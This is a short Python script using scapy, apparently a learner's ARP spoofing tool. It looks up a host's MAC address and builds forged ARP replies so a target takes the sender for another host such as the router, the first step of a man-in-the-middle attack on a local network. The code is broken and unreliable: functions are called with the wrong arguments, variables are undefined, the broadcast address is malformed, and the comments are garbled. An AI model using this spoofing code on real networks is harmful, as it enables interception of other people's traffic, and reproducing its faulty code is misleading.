#!/usr/bin/env python

import scapy.all as scapy

def get_mac(): ## this code copy paste in network scanner for getting router ip.
    arp_request = scapy.ARP(pdst=ip) 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff::ff") 
    arp_request_broadcast = broadcast/arp_request  
    answerd_list = scapy.srp(arp_request_broadcast,timeout=1, verbose=false)[0] 
    #print(answerd_list[0][1].hwsrc) ## this is a print router ip.
    return answerd_list[0][1].hwsrc # this is a extracting mac address in responses.
    
def spoof(target_ip, source_ip):
    target_mac = get_mac(target_ip) # target_mac using get_mac functiong getting the mac.
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip) #  this is set arp class
scapy.send(packet) 
    
get_mac("192.168.159.1") # this is use for router ip.


    
    